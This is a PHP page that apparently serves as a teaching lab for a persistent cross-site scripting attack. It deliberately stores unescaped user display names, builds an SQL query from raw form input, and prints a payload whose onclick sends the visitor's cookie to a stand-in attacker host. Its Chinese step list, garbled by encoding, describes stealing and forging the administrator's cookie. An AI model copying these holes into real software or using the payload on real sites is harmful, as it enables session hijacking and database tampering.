<?php
session_start();
require_once("DB.php");

if(isset($_GET['logout']) && $_GET['logout']=="1"){
	unset($_SESSION['USER_NAME']);
}

if(!isset($_SESSION['USER_NAME'])) {
	echo "Need to login";
} else {
	echo "<h1>Welcome ".$_SESSION['USER_NAME']."</h1><hr>";
	
	if(isset($_POST['submit'])) {
		$query="update tb_user set display_name='".$_POST['disp_name']."' where user_name='".$_SESSION['USER_NAME']."';";
		$dbconn->query($query);
		echo "Update Success";
	} else {
		if(strcmp($_SESSION['USER_NAME'],'admin')==0) {
			echo "<h2>�û����б�</h2>";
			$query = "select display_name from tb_user where user_name!='admin'";
			$res = $dbconn->query($query);
			echo "<ul>";
			while($row=mysql_fetch_array($res, MYSQL_ASSOC)) {
				echo "<li>$row[display_name]</li>";
			}
			echo "</ul>";
		}
	}
}
?>

<h1>Persistent XSS Attack</h1>
<hr />

<form name="tgs" id="tgs" method="post" action="xss_home.php">
�޸�����:<input type="text" id="disp_name" name="disp_name" value="">

<input name="submit" type="submit" value="Update">
</form>

<h2>Attack string:</h2>
<?php
echo htmlentities("<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">peishuaishuai01</a>");
?>

<h3>����:</h3>
<ul>
<li>����Ա��½���ܿ����û��б�</li>
<li>��ͨ�û���¼���ܸ��¸�����Ϣ</li>
<li>��ͨ�û���½����д�����ַ���</li>
<li>����Ա��½�������������URL</li>
<li>������վ�յ�COOKIE</li>
<li>������α��COOKIE����½����Ա��̨</li>
</ul>

<h2><a href="xss_login.php">��½ҳ��</a>
<a href="xss_home.php?logout=1">�˳�</a></h2>